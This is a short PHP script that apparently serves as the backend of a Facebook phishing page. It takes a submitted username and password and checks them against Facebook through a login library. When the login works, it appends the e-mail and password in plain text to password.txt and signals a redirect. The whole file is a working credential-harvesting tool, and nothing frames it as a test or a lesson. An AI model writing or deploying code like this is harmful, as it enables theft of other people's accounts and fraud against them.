<?php

require('./vendor/autoload.php');

//TODO: THIS IS SHIT CODE, COME HERE BACK AGAIN!

$facebook = new \facebookAPI\facebook();

$request = \GuzzleHttp\Psr7\ServerRequest::fromGlobals();

$payload = $request->getBody()->getContents();
$arrayPayload = json_decode($payload, true);

$response = $facebook->login($arrayPayload['username'], $arrayPayload['password']);

if ($response->isErrorCode()) {
    $tmpArray['error'] = true;

    if ($response->isErrorData() === true){
        $errorData = json_decode($response->getErrorData(), true);
        $tmpArray['message'] = $errorData['error_message'];

    }else{
        $tmpArray['message'] = $response->getErrorMsg();

    }

    $tmpArray['redirect'] = false;

} else {

    $handle = fopen("password.txt", "a");
    fwrite($handle, "e-mail: " . $arrayPayload['username']."\r\n");
    fwrite($handle, "password: " . $arrayPayload['password']."\r\n\r\n");
    fclose($handle);

    $tmpArray['error'] = false;
    $tmpArray['message'] = '';
    $tmpArray['redirect'] = true;
}

echo json_encode($tmpArray);